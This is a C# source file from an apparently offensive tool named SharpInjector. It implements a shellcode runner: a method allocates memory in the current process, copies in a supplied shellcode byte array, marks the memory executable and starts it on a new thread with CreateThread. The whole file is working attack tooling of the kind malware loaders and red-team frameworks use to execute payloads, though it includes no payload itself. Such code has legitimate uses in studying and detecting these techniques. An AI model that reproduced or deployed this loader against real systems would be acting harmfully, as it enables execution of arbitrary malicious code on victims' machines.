using System;
using System.Collections.Generic;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading.Tasks;

namespace SharpInjector
{
    class CreateThread
    {
        public static void ExecuteCreateThread(byte[] Shellcode)
        {
            IntPtr hThread = IntPtr.Zero;
            UInt32 threadId = 0;

            Console.WriteLine("[*] Allocating shellcode in current process...");
            IntPtr Address = WinAPI.VirtualAlloc(IntPtr.Zero, Shellcode.Length, WinAPI.MEM_COMMIT, WinAPI.PAGE_READWRITE);
            if (Address == IntPtr.Zero)
            {
                return;
            }

            Marshal.Copy(Shellcode, 0, Address, Shellcode.Length);

            if (!WinAPI.VirtualProtect(Address, Shellcode.Length, WinAPI.PAGE_EXECUTE_READ, out uint OldProtect))
            {
                WinAPI.VirtualFree(Address, 0, WinAPI.FreeType.MEM_RELEASE);
                return;
            }

            Console.WriteLine("[*] Calling CreateThread...");
            hThread = WinAPI.CreateThread((IntPtr)0, 0, Address, IntPtr.Zero, 0, ref threadId);
            if (hThread == IntPtr.Zero)
            {
                WinAPI.VirtualFree(Address, 0, WinAPI.FreeType.MEM_RELEASE);
                return;
            }

            WinAPI.WaitForSingleObject(hThread, 0xFFFFFFFF);
            Console.WriteLine("[*] Shellcode executed");
        }
    }
}
